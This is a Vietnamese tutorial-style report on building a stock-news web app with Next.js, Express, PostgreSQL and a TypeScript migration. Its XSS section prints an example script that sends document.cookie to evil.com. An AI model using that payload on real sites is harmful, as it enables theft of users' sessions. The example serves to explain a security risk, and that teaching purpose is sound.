# Báo Cáo Học Tập: Dự Án ThanhDangBullish

> **Dành cho ai?** Tài liệu này được viết theo phong cách hướng dẫn, dành cho những bạn đang học lập trình web full-stack. Mỗi quyết định trong dự án đều được giải thích rõ lý do — không chỉ là "làm gì" mà còn là "tại sao làm vậy".

---

## Mục Lục

1. [Tổng quan dự án](#1-tổng-quan-dự-án)
2. [Kiến trúc hệ thống](#2-kiến-trúc-hệ-thống)
3. [Phần Backend — Node.js + Express + PostgreSQL](#3-phần-backend)
4. [Phần Frontend — Next.js + React + TailwindCSS + Redux](#4-phần-frontend)
5. [Chuyển đổi từ JavaScript sang TypeScript](#5-chuyển-đổi-typescript)
6. [Những lỗi gặp phải và cách xử lý](#6-xử-lý-lỗi)
7. [Tổng kết và bài học rút ra](#7-tổng-kết)

---

## 1. Tổng Quan Dự Án

### Dự án này là gì?

**ThanhDangBullish** là một website tin tức chứng khoán (stock news). Người dùng có thể:
- Đọc tin tức thị trường tài chính
- Xem giá cổ phiếu
- Lọc tin theo danh mục (Forex, Crypto, Phân tích, v.v.)
- Tìm kiếm bài viết
- Đăng ký / đăng nhập tài khoản

### Công nghệ sử dụng

```
Frontend (giao diện)          Backend (máy chủ)
─────────────────────         ────────────────────
Next.js (React framework)     Node.js + Express.js
TailwindCSS (CSS)             PostgreSQL (cơ sở dữ liệu)
Redux Toolkit (quản lý state) JWT (xác thực người dùng)
Axios (gọi API)               bcrypt (mã hoá mật khẩu)
```

> 💡 **Giải thích cho người mới:** Hãy hình dung dự án như một nhà hàng. **Frontend** là khu vực khách ngồi ăn — họ thấy menu, gọi món, nhận thức ăn. **Backend** là nhà bếp — xử lý đơn hàng, nấu nướng, quản lý kho. **Database** là kho chứa nguyên liệu.

---

## 2. Kiến Trúc Hệ Thống

### Cấu trúc thư mục

```
ThanhDangBullish/
├── backend/          ← Máy chủ API (chạy ở cổng 5000)
│   ├── server.ts
│   ├── src/
│   │   ├── app.ts
│   │   ├── config/
│   │   ├── controllers/
│   │   ├── middleware/
│   │   ├── routes/
│   │   ├── db/
│   │   └── types/
│   └── package.json
│
└── frontend/         ← Giao diện người dùng (chạy ở cổng 3000)
    ├── src/
    │   ├── app/
    │   ├── components/
    │   ├── store/
    │   ├── services/
    │   ├── types/
    │   └── lib/
    └── package.json
```

### Tại sao tách Backend và Frontend ra hai thư mục riêng?

Đây là mô hình **Separation of Concerns** (tách biệt trách nhiệm) — một nguyên tắc quan trọng trong lập trình.

**Lợi ích thực tế:**
- Backend và Frontend có thể deploy lên hai server khác nhau
- Team backend và frontend có thể làm việc độc lập
- Dễ dàng thay thế frontend (ví dụ: từ web sang mobile app) mà không cần sửa backend
- Mỗi phần có `package.json` riêng, quản lý thư viện độc lập

> 💡 **Ví dụ thực tế:** Facebook có hàng trăm developer. Team mobile làm app iOS, team web làm trang web, team backend làm API. Tất cả đều gọi chung một bộ API. Đây chính là lý do tại sao tách riêng.

---

## 3. Phần Backend

### 3.1 Khởi tạo dự án — Tại sao không dùng ORM?

Khi làm việc với cơ sở dữ liệu, có hai lựa chọn:
- **ORM** (Sequelize, Prisma): Viết code JavaScript/TypeScript, tự động tạo SQL
- **Raw SQL**: Viết SQL trực tiếp

Dự án này chọn **raw SQL** với thư viện `pg` (node-postgres).

**Tại sao?**
```sql
-- Truy vấn phức tạp trong newsController: lấy bài viết kèm tác giả,
-- danh mục và danh sách cổ phiếu liên quan — tất cả trong 1 câu SQL
SELECT
  n.id, n.title, n.slug,
  json_build_object('id', u.id, 'full_name', u.full_name) AS author,
  json_build_object('id', c.id, 'name', c.name) AS category,
  json_agg(DISTINCT jsonb_build_object('id', s.id, 'symbol', s.symbol)) AS stocks
FROM news n
LEFT JOIN users u ON n.author_id = u.id
LEFT JOIN categories c ON n.category_id = c.id
LEFT JOIN news_stocks ns ON n.id = ns.news_id
LEFT JOIN stocks s ON ns.stock_id = s.id
GROUP BY n.id, u.id, c.id
```

Câu SQL này lấy bài viết cùng với thông tin tác giả, danh mục, và mảng cổ phiếu liên quan trong **một lần truy vấn duy nhất**. Với ORM, bạn thường cần 3–4 truy vấn riêng lẻ, hoặc phải viết code phức tạp hơn để đạt kết quả tương tự.

> 💡 **Bài học:** ORM rất tốt cho CRUD đơn giản. Nhưng khi cần truy vấn phức tạp với nhiều bảng, raw SQL rõ ràng và hiệu quả hơn.

---

### 3.2 Biến môi trường (Environment Variables)

**File `.env`** chứa các thông tin nhạy cảm:
```env
DB_PASSWORD=123456
JWT_SECRET=change_me_to_a_long_random_string
```

**File `.env.example`** là bản mẫu, không chứa giá trị thật:
```env
DB_PASSWORD=your_password
JWT_SECRET=your_super_secret_key
```

**Tại sao phải tách ra?**

Hãy tưởng tượng bạn upload code lên GitHub. Nếu file `.env` bị commit lên, hacker có thể đọc được mật khẩu database và secret key của bạn. Đó là lý do `.env` phải được thêm vào `.gitignore` và KHÔNG BAO GIỜ được commit lên.

`.env.example` thì ngược lại — nó được commit để người khác clone dự án về biết họ cần thiết lập những biến nào.

> ⚠️ **Lỗi phổ biến của người mới:** Commit file `.env` lên GitHub. Đây là một lỗi bảo mật nghiêm trọng, đặc biệt nếu repository là public.

---

### 3.3 Cấu trúc Express App (`src/app.ts`)

Khi nhận một request, Express chạy các **middleware** theo thứ tự từ trên xuống. Thứ tự này rất quan trọng:

```
Request đến
    ↓
helmet()         ← Bảo mật headers (phải đứng đầu)
    ↓
morgan()         ← Ghi log request
    ↓
cors()           ← Cho phép frontend gọi API
    ↓
express.json()   ← Đọc body của request
    ↓
/api/auth        ← Route xử lý logic
    ↓
404 handler      ← Nếu không có route nào khớp
    ↓
errorHandler     ← Xử lý lỗi (phải đứng CUỐI CÙNG)
```

**Tại sao `errorHandler` phải đứng cuối?**

Express nhận biết error handler nhờ vào việc nó có **4 tham số**: `(err, req, res, next)`. Nếu đặt nó trước các routes, nó sẽ không bao giờ được gọi khi xảy ra lỗi trong route đó.

---

### 3.4 Connection Pool (`src/config/database.ts`)

```typescript
const pool = new Pool({
  max: 20,                      // Tối đa 20 kết nối cùng lúc
  idleTimeoutMillis: 30_000,    // Đóng kết nối rảnh sau 30 giây
  connectionTimeoutMillis: 2_000 // Báo lỗi nếu không kết nối được sau 2 giây
});
```

**Tại sao dùng Pool (nhóm kết nối)?**

Kết nối đến PostgreSQL mất thời gian (thường 20–100ms). Nếu mỗi request tạo một kết nối mới rồi đóng lại, website sẽ rất chậm.

Pool hoạt động như thế này:
```
Lần đầu: Tạo 5 kết nối sẵn → lưu vào pool
Request 1 đến → mượn kết nối số 1 → trả lại pool
Request 2 đến → mượn kết nối số 2 → trả lại pool
...
```

Tương tự như bể bơi chung — không cần đào bể mới mỗi lần bạn muốn bơi.

---

### 3.5 Thiết kế Database Schema

```sql
users       ← Người dùng (đăng ký, đăng nhập)
categories  ← Danh mục tin tức (Market News, Crypto...)
stocks      ← Cổ phiếu (AAPL, MSFT, NVDA...)
news        ← Bài viết tin tức
news_stocks ← Bảng trung gian: bài viết ↔ cổ phiếu (quan hệ nhiều-nhiều)
bookmarks   ← Bài viết đã lưu của người dùng
```

**Khái niệm quan trọng: Quan hệ Nhiều-Nhiều (Many-to-Many)**

Một bài viết có thể đề cập nhiều cổ phiếu (AAPL, MSFT, GOOGL). Một cổ phiếu có thể xuất hiện trong nhiều bài viết. Đây là quan hệ nhiều-nhiều.

Để lưu quan hệ này trong database quan hệ (relational database), cần một **bảng trung gian**:

```
news (id=1, title="Apple tăng giá...")
news (id=2, title="Microsoft và Google đối đầu...")

stocks (id=10, symbol="AAPL")
stocks (id=11, symbol="MSFT")
stocks (id=12, symbol="GOOGL")

news_stocks:
  news_id=1, stock_id=10   (bài 1 đề cập AAPL)
  news_id=2, stock_id=11   (bài 2 đề cập MSFT)
  news_id=2, stock_id=12   (bài 2 đề cập GOOGL)
```

**Tại sao dùng UUID thay vì số nguyên tăng dần (1, 2, 3...)?**

- Số nguyên tăng dần: `id=1`, `id=2`, `id=3` → hacker dễ đoán và thử: `/api/users/1`, `/api/users/2`...
- UUID: `id=f47ac10b-58cc-4372-a567-0e02b2c3d479` → không thể đoán được
- UUID có thể tạo ở nhiều server khác nhau mà không bị trùng (quan trọng khi scale)

---

### 3.6 Xác Thực & Phân Quyền (Authentication & Authorization)

Đây là một trong những phần phức tạp nhất, cần hiểu rõ sự khác biệt:

| Khái niệm | Câu hỏi | Ví dụ |
|---|---|---|
| **Authentication** (Xác thực) | "Bạn là ai?" | Đăng nhập bằng email + mật khẩu |
| **Authorization** (Phân quyền) | "Bạn được làm gì?" | Chỉ admin mới được xoá bài viết |

**Quy trình JWT (JSON Web Token):**

```
1. Người dùng gửi: { email: "...", password: "..." }
         ↓
2. Server kiểm tra mật khẩu với bcrypt
         ↓
3. Server tạo JWT: jwt.sign({ id: user.id }, SECRET_KEY)
         ↓
4. Server trả về token cho client
         ↓
5. Client lưu token vào localStorage
         ↓
6. Mỗi request tiếp theo: gửi kèm header "Authorization: Bearer <token>"
         ↓
7. Server giải mã token → biết người dùng là ai
```

**Tại sao phải tra cứu database khi xác thực token?**

```typescript
// Trong middleware auth.ts
const decoded = jwt.verify(token, JWT_SECRET); // Giải mã token
const user = await query('SELECT * FROM users WHERE id = $1', [decoded.id]); // Tra DB
```

Dù token hợp lệ, server vẫn tra database để kiểm tra tài khoản có bị vô hiệu hoá không (`is_active = false`). Nếu chỉ tin vào token, một tài khoản bị khoá vẫn có thể truy cập cho đến khi token hết hạn.

**bcrypt và cost factor 12:**

```typescript
const hash = await bcrypt.hash(password, 12); // 12 là "cost factor"
```

bcrypt cố tình làm chậm quá trình hash. Cost factor 12 nghĩa là máy tính phải thực hiện 2^12 = 4096 vòng lặp. Điều này mất khoảng 250ms — không đáng kể với người dùng bình thường, nhưng nếu hacker cố brute-force hàng triệu mật khẩu, họ sẽ mất hàng năm.

> 💡 **Bài học bảo mật:** KHÔNG BAO GIỜ lưu mật khẩu dưới dạng plain text. Luôn dùng bcrypt hoặc argon2.

---

### 3.7 CRUD và REST API Design

Controllers được tổ chức theo nguyên tắc RESTful:

```
GET    /api/news          → Lấy danh sách bài viết
GET    /api/news/:slug    → Lấy một bài viết cụ thể
POST   /api/news          → Tạo bài viết mới (cần auth)
PUT    /api/news/:id      → Cập nhật bài viết (cần auth)
DELETE /api/news/:id      → Xoá bài viết (cần auth + admin)
```

**Tại sao dùng `slug` thay vì `id` cho URL bài viết?**

- URL với id: `/news/f47ac10b-58cc-4372-a567-0e02b2c3d479` → xấu, khó nhớ, không tốt cho SEO
- URL với slug: `/news/apple-tang-gia-manh-trong-quy-3-2024` → đẹp, dễ đọc, tốt cho SEO

Slug được tạo tự động từ tiêu đề bài viết bằng thư viện `slugify`:
```typescript
let slug = slugify("Apple tăng giá mạnh trong Q3 2024", { lower: true, strict: true });
// Kết quả: "apple-tang-gia-manh-trong-q3-2024"
```

---

### 3.8 Xử Lý Lỗi Tập Trung (Centralized Error Handling)

```typescript
// errorHandler.ts — middleware cuối cùng
const errorHandler = (err: AppError, req, res, next) => {
  if (err.code === '23505') { // PostgreSQL: duplicate key
    return res.status(409).json({ error: 'Dữ liệu đã tồn tại' });
  }
  // ...
};
```

**Tại sao xử lý lỗi tập trung?**

Không có error handler tập trung, mỗi controller phải tự xử lý từng loại lỗi:
```typescript
// ❌ Cách sai — lặp code ở khắp nơi
export const create = async (req, res) => {
  try { ... }
  catch (err) {
    if (err.code === '23505') res.status(409).json({ error: '...' });
    else if (err.code === '23503') res.status(400).json({ error: '...' });
    else res.status(500).json({ error: '...' });
  }
};
```

Với error handler tập trung:
```typescript
// ✅ Cách đúng — mỗi controller chỉ cần gọi next(err)
export const create = async (req, res, next) => {
  try { ... }
  catch (err) { next(err); } // Chuyển lỗi cho error handler xử lý
};
```

---

## 4. Phần Frontend

### 4.1 Tại sao dùng Next.js thay vì React thuần?

React thuần (Create React App) tạo ra **Single Page Application (SPA)** — toàn bộ ứng dụng chạy trên trình duyệt, JavaScript render HTML.

Next.js thêm các tính năng quan trọng:

| Tính năng | Lợi ích |
|---|---|
| **App Router** | Định tuyến dựa trên cấu trúc thư mục |
| **Server Components** | Render HTML trên server → tải trang nhanh hơn |
| **SEO-friendly** | Search engine đọc được nội dung (quan trọng cho trang tin tức) |
| **Image Optimization** | Tự động tối ưu ảnh, lazy loading |

Với website tin tức, **SEO cực kỳ quan trọng**. Bài viết phải được Google index. React thuần render HTML ở client-side, Google có thể khó index được nội dung.

---

### 4.2 App Router — Định Tuyến Theo Thư Mục

```
src/app/
├── page.tsx              → Route: /
├── layout.tsx            → Layout chung cho toàn app
├── news/
│   ├── page.tsx          → Route: /news
│   └── [id]/
│       └── page.tsx      → Route: /news/bai-viet-abc (dynamic route)
├── stocks/
│   └── page.tsx          → Route: /stocks
└── auth/
    ├── login/
    │   └── page.tsx      → Route: /auth/login
    └── register/
        └── page.tsx      → Route: /auth/register
```

**`[id]` trong tên thư mục nghĩa là gì?**

Dấu ngoặc vuông `[id]` là cú pháp của Next.js cho **dynamic routes** — tương tự Express với `:slug`. Khi người dùng truy cập `/news/apple-tang-gia`, Next.js hiểu `id = "apple-tang-gia"` và có thể đọc bằng:

```typescript
const { id: slug } = useParams<{ id: string }>();
```

---

### 4.3 Redux Toolkit — Quản Lý State Toàn Cục

**Khi nào cần Redux?**

Không phải lúc nào cũng cần Redux. Chỉ dùng khi:
- State cần chia sẻ giữa **nhiều components không có quan hệ cha-con**
- State cần **persist** qua nhiều lần navigate

Trong dự án này, Redux quản lý:

```
auth slice:
  user, token, loading, error
  → Header cần biết user để hiển thị tên
  → Protected pages cần biết đã đăng nhập chưa

news slice:
  articles, pagination, currentArticle, featuredNews, categories
  → Home page cần featuredNews
  → News list page cần articles + pagination
  → Article detail page cần currentArticle

stocks slice:
  stocks, currentStock
  → Sidebar cần stocks để hiển thị bảng giá
  → Stocks page cần danh sách đầy đủ
```

**Tại sao Redux Toolkit thay vì Redux thuần?**

Redux thuần cần rất nhiều boilerplate code (code lặp đi lặp lại). Redux Toolkit giảm thiểu điều này:

```typescript
// Redux Toolkit — gọn gàng, rõ ràng
const newsSlice = createSlice({
  name: 'news',
  initialState,
  reducers: {
    clearCurrentArticle(state) {
      state.currentArticle = null; // Immer xử lý immutability tự động
    }
  }
});
```

---

### 4.4 Axios Interceptors — Xử Lý Token Tự Động

```typescript
// Tự động gắn token vào mỗi request
api.interceptors.request.use((config) => {
  const token = localStorage.getItem('token');
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});

// Tự động đăng xuất khi token hết hạn
api.interceptors.response.use(
  (res) => res,
  (err) => {
    if (err.response?.status === 401) {
      localStorage.removeItem('token');
      window.location.href = '/auth/login';
    }
    return Promise.reject(err);
  }
);
```

**Tại sao dùng interceptors?**

Không có interceptors, mỗi API call phải tự xử lý token:
```typescript
// ❌ Phải lặp lại ở mọi nơi
const res = await axios.get('/api/news', {
  headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
});
```

Với interceptors, một lần cấu hình — tất cả requests đều được tự động xử lý.

---

### 4.5 Component Design — Tái Sử Dụng Code

**Button Component với variants:**

```typescript
// Thay vì tạo nhiều button khác nhau:
// <GreenButton>, <RedButton>, <GrayButton>...

// Tạo một component linh hoạt với props:
<Button variant="primary">Đăng nhập</Button>
<Button variant="danger" loading={isDeleting}>Xoá</Button>
<Button variant="outline" size="sm">Huỷ</Button>
```

`loading` prop vô hiệu hoá nút và hiển thị spinner, ngăn người dùng nhấn nhiều lần.

**NewsCard với `size` prop:**

```typescript
// Bài viết nổi bật (lớn)
<NewsCard article={featuredArticle} size="lg" />

// Danh sách bài viết thông thường (vừa)
<NewsCard article={article} size="md" />
```

Một component, nhiều cách hiển thị — đây là nguyên tắc **DRY (Don't Repeat Yourself)**.

---

### 4.6 Tại Sao Dùng `Suspense` Cho News Page?

```typescript
// src/app/news/page.tsx
export default function NewsPage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <NewsContent />  {/* Component dùng useSearchParams() */}
    </Suspense>
  );
}
```

`useSearchParams()` đọc URL parameters như `/news?category=crypto`. Trong Next.js App Router, hook này có thể gây **suspend** (tạm dừng render) trong quá trình hydration — khi React "bật" JavaScript lên cho HTML được render từ server.

Nếu không bọc trong `Suspense`, Next.js sẽ báo lỗi build. `Suspense` cung cấp fallback UI để hiển thị trong thời gian component đang chờ.

---

### 4.7 `dangerouslySetInnerHTML` — Khi Nào Nên Dùng?

```typescript
// Trong article detail page
<div className="article-content"
  dangerouslySetInnerHTML={{ __html: article.content ?? '' }} />
```

Tên `dangerouslySetInnerHTML` nghe rất đáng sợ — và đúng như vậy nếu dùng sai cách.

**Vấn đề:** Nếu nội dung đến từ **người dùng nhập vào** (comment, bio...), hacker có thể chèn JavaScript độc hại (XSS attack):
```html
<!-- Hacker nhập vào form -->
<script>document.cookie = 'stolen'; fetch('http://evil.com/' + document.cookie);</script>
```

**Tại sao dùng ở đây lại an toàn?** Nội dung bài viết chỉ đến từ **editor/admin** — những người đã được xác thực và tin tưởng. Không phải từ người dùng thông thường. Trong thực tế sản xuất, bạn nên thêm một bước **sanitize** (làm sạch) HTML dù sao, dùng thư viện như `DOMPurify`.

---

## 5. Chuyển Đổi TypeScript

### 5.1 TypeScript là gì và tại sao cần?

JavaScript là ngôn ngữ **dynamic typed** — bạn có thể làm điều này và không bị lỗi ngay:

```javascript
// JavaScript — chỉ lỗi khi chạy
const user = null;
console.log(user.name); // Lỗi: Cannot read property 'name' of null
// ← Lỗi này chỉ xuất hiện khi người dùng đang dùng app!
```

TypeScript là **static typed** — lỗi được phát hiện ngay khi viết code:

```typescript
// TypeScript — lỗi ngay khi viết code
const user: User | null = null;
console.log(user.name);
// ← Editor báo lỗi ngay: "Object is possibly null"
// ← Bạn phải sửa trước khi chạy
```

Với dữ liệu tài chính, một lỗi nhỏ có thể hiển thị sai giá cổ phiếu hay số tiền — TypeScript giúp ngăn chặn những lỗi đó.

---

### 5.2 Cách Tiếp Cận Migration

**Quyết định: Chuyển đổi hoàn toàn (không hybrid)**

Có thể cấu hình TypeScript với `allowJs: true` để `.js` và `.ts` cùng tồn tại. Nhưng điều này tạo ra **"vùng xám"** — code TypeScript vẫn có thể import code JavaScript không có types, làm giảm giá trị của TypeScript.

Thay vào đó, dự án chọn: **xoá tất cả file `.js`/`.jsx`, thay thế bằng `.ts`/`.tsx` hoàn toàn**.

---

### 5.3 Type Definitions — Xương Sống Của TypeScript

**Backend (`src/types/index.ts`):**

```typescript
export interface AuthUser {
  id: string;
  email: string;
  full_name: string;
  role: 'user' | 'editor' | 'admin'; // Chỉ 3 giá trị này được phép
  is_active: boolean;
}

export interface NewsArticle {
  id: string;
  title: string;
  slug: string;
  // author là object lồng nhau, không phải chỉ là author_id
  author?: { id: string; full_name: string; avatar_url?: string };
  stocks?: { id: string; symbol: string; company_name: string }[];
  // ... các field khác
}
```

**Tại sao `role` là Union Type thay vì `string`?**

```typescript
role: string           // Cho phép bất kỳ giá trị nào — không an toàn
role: 'user' | 'editor' | 'admin'  // Chỉ 3 giá trị — TypeScript báo lỗi nếu sai
```

Nếu ai đó viết `role: 'superadmin'` (typo), TypeScript sẽ báo lỗi ngay.

---

### 5.4 Express Augmentation — Mở Rộng Kiểu Có Sẵn

**Vấn đề:** Express không biết rằng `req.user` tồn tại — nó không có trong type definition gốc.

**Giải pháp: Declaration Merging**

```typescript
// src/types/express.d.ts
declare global {
  namespace Express {
    interface Request {
      user?: AuthUser; // Thêm property 'user' vào Express Request
    }
  }
}
```

Đây là tính năng đặc biệt của TypeScript: bạn có thể **mở rộng interface của thư viện bên ngoài** mà không cần sửa source code của thư viện đó.

**Tại sao `user` là optional (`?`)?**

```typescript
user?: AuthUser  // Optional — có thể undefined
```

Các route public (không cần đăng nhập) sẽ có `req.user = undefined`. Nếu khai báo `user: AuthUser` (bắt buộc), TypeScript sẽ báo lỗi ở mọi nơi dùng `req` mà không check user.

Ở những route đã có middleware `authenticate`, ta biết chắc `req.user` đã được set, nên dùng **non-null assertion** (`!`):
```typescript
req.user!.id  // Nói với TypeScript: "Tôi chắc chắn user không phải null ở đây"
```

---

### 5.5 Generic Functions — Hàm Linh Hoạt Với Kiểu Dữ Liệu

```typescript
// Hàm query với generic type T
export const query = <T extends QueryResultRow = QueryResultRow>(
  text: string,
  params?: unknown[]
): Promise<QueryResult<T>> => pool.query<T>(text, params);
```

Sử dụng:
```typescript
// TypeScript biết rows[0] có kiểu AuthUser
const result = await query<AuthUser>('SELECT id, email FROM users WHERE id = $1', [id]);
const user: AuthUser = result.rows[0]; // Không cần cast!

// TypeScript biết rows[0] có kiểu NewsArticle
const result = await query<NewsArticle>('SELECT * FROM news WHERE slug = $1', [slug]);
const article: NewsArticle = result.rows[0];
```

> 💡 **Giải thích Generic:** Hãy nghĩ Generic như một "khuôn mẫu". `query<T>` là hàm query nhận vào một kiểu `T` và trả về kết quả với kiểu đó. Giống như máy làm kẹo — cùng một máy, đổi khuôn là ra kẹo hình khác nhau.

---

### 5.6 Typed Redux Hooks

**Vấn đề không có typed hooks:**

```typescript
const dispatch = useDispatch(); // type: Dispatch<AnyAction>
dispatch(fetchNews()); // TypeScript không biết fetchNews() trả về gì
```

**Giải pháp:**

```typescript
// src/store/hooks.ts
export const useAppDispatch = () => useDispatch<AppDispatch>();
export const useAppSelector: TypedUseSelectorHook<RootState> = useSelector;
```

```typescript
// Trong component
const dispatch = useAppDispatch(); // type: AppDispatch (biết về tất cả thunks)
const { articles } = useAppSelector((s) => s.news); // s được type đầy đủ
// articles có type: Article[] — không phải any hay unknown
```

---

### 5.7 `import 'dotenv/config'` Phải Là Import Đầu Tiên

```typescript
// server.ts
import 'dotenv/config'; // ← PHẢI ĐẦU TIÊN
import app from './src/app';
import { testConnection } from './src/config/database';
```

**Tại sao thứ tự quan trọng?**

TypeScript biên dịch `import` thành `require()` theo thứ tự khai báo. `database.ts` đọc `process.env.DB_HOST` ngay khi được import. Nếu `dotenv/config` chưa chạy, `process.env.DB_HOST` sẽ là `undefined`.

```javascript
// Được biên dịch thành:
require('dotenv/config');         // ← Chạy trước, nạp .env vào process.env
const app = require('./src/app'); // ← Lúc này process.env đã có giá trị
```

---

## 6. Xử Lý Lỗi

### Lỗi 1: `ECONNRESET` khi `npm install`

**Mô tả:** Lần đầu chạy `npm install` ở frontend bị lỗi mạng.

**Nguyên nhân:** Kết nối mạng bị ngắt giữa chừng khi tải packages — lỗi không liên quan đến code.

**Xử lý:** Chạy lại `npm install`. Lần thứ hai thành công.

**Bài học:** Lỗi mạng là transient (tạm thời). Thử lại là giải pháp đầu tiên.

---

### Lỗi 2: Next.js 14.0.4 có lỗ hổng bảo mật

**Mô tả:** `npm` cảnh báo phiên bản 14.0.4 có lỗ hổng bảo mật nghiêm trọng.

**Nguyên nhân:** Next.js 14.0.4 có lỗ hổng cho phép bỏ qua middleware (middleware bypass).

**Xử lý:** Chạy `npm install next@latest` để nâng cấp lên phiên bản mới nhất đã được vá.

**Bài học:** Luôn chú ý cảnh báo bảo mật từ `npm audit`. Nâng cấp package khi có lỗ hổng.

---

### Lỗi 3: `Could not find a declaration file for module 'pg'`

**Mô tả:** Khi chạy `tsc --noEmit` ở backend, TypeScript báo lỗi không tìm thấy type definitions cho `pg`.

**Nguyên nhân:** Package `pg` không bundled types. Cần cài đặt riêng `@types/pg`.

**Xử lý:**
```bash
npm install -D @types/pg
```

**Bài học:** Nhiều package JavaScript không có TypeScript types tích hợp. Cần cài thêm gói `@types/<package-name>`. Bạn có thể kiểm tra tại [DefinitelyTyped](https://github.com/DefinitelyTyped/DefinitelyTyped) hoặc [npmjs.com](https://npmjs.com).

---

### Lỗi 4: `Property 'toUpperCase' does not exist on type 'string | string[]'`

**Mô tả:** TypeScript báo lỗi khi gọi `.toUpperCase()` trên `req.params.symbol`.

**Nguyên nhân:** Express type định nghĩa `req.params` là `{ [key: string]: string | string[] }`. Kiểu `string[]` không có method `.toUpperCase()`.

**Xử lý:**
```typescript
// ❌ Trước
req.params.symbol.toUpperCase()

// ✅ Sau — String() ép kiểu về string trước
String(req.params.symbol).toUpperCase()
```

**Bài học:** TypeScript đặt ra câu hỏi: "Nếu value này là `string[]`, code của bạn sẽ thế nào?" Đây chính xác là lý do TypeScript hữu ích — nó buộc bạn nghĩ đến edge cases.

---

### Lỗi 5: `LoginCredentials` not assignable to `Record<string, string>`

**Mô tả:** Redux slice gọi `authApi.login(credentials)` với kiểu `LoginCredentials`, nhưng `authApi.login` được khai báo nhận `Record<string, string>`.

**Vấn đề kỹ thuật:**
```typescript
// LoginCredentials không có index signature
interface LoginCredentials {
  email: string;
  password: string;
}

// Record<string, string> yêu cầu index signature
// Nghĩa là: có thể thêm bất kỳ key nào với giá trị string
// LoginCredentials không đảm bảo điều đó
```

**Xử lý:** Đổi kiểu parameter của `authApi.login` thành `unknown`:
```typescript
login: (data: unknown) => api.post('/auth/login', data)
// unknown là kiểu an toàn nhất — Axios chấp nhận bất kỳ data nào
```

**Bài học:** Khi một hàm chỉ "chuyển tiếp" data mà không xử lý nó, dùng `unknown` là hợp lý. `unknown` an toàn hơn `any` vì TypeScript vẫn kiểm tra type ở nơi nhận.

---

## 7. Tổng Kết

### Kiến Trúc Tổng Quan

```
Trình duyệt
    │
    │ HTTP Request (JSON)
    ▼
Next.js Frontend (port 3000)
    │
    │ axios → NEXT_PUBLIC_API_URL
    ▼
Express Backend (port 5000)
    │
    │ pg → connection pool
    ▼
PostgreSQL Database
```

### Các Nguyên Tắc Quan Trọng Đã Học

| Nguyên tắc | Áp dụng trong dự án |
|---|---|
| **Separation of Concerns** | Backend và Frontend tách biệt hoàn toàn |
| **DRY (Don't Repeat Yourself)** | Components tái sử dụng (Button, Input, NewsCard) |
| **Security by Default** | Helmet, bcrypt cost 12, JWT re-validation, UUID |
| **Fail Fast** | `testConnection()` — lỗi rõ ràng ngay khi khởi động |
| **Single Source of Truth** | Redux store, type definitions tập trung |
| **Centralized Error Handling** | Một error handler cho toàn bộ Express app |
| **Type Safety** | TypeScript strict mode, không dùng `any` |

### Những Điều Có Thể Cải Thiện Tiếp Theo

1. **Rate Limiting:** Giới hạn số lần gọi API từ một IP — ngăn brute-force và DDoS
2. **Refresh Token:** JWT ngắn hạn (15 phút) + refresh token dài hạn — bảo mật hơn
3. **Input Sanitization:** Dùng `DOMPurify` để làm sạch HTML content của bài viết
4. **Redis Caching:** Cache danh sách bài viết phổ biến — giảm tải database
5. **WebSocket:** Cập nhật giá cổ phiếu realtime thay vì static data
6. **Image Upload:** Hoàn thiện tính năng upload ảnh với Multer (đã có scaffold)
7. **Tests:** Unit tests cho controllers, integration tests cho API endpoints

### Bảng Thống Kê Cuối Cùng

| Giai đoạn | Files tạo mới | Files xoá | Lỗi TypeScript sửa |
|---|---|---|---|
| Scaffold ban đầu (JS) | 49 files | 0 | — |
| Migration sang TypeScript (BE) | 17 files `.ts` | 15 files `.js` | 4 |
| Migration sang TypeScript (FE) | 27 files `.ts`/`.tsx` | 23 files `.js`/`.jsx` | 0 |
| **Tổng cộng** | **93 files** | **38 files** | **4** |

---

> **Lời kết:** Lập trình không chỉ là viết code chạy được — mà là viết code **đúng, an toàn, và dễ bảo trì**. TypeScript, design patterns, và các quyết định kiến trúc trong dự án này đều hướng đến mục tiêu đó. Khi bạn gặp một quyết định có vẻ "phức tạp hơn cần thiết", hãy hỏi: "Nó giải quyết vấn đề gì khi dự án lớn hơn hoặc khi nhiều người cùng làm việc?"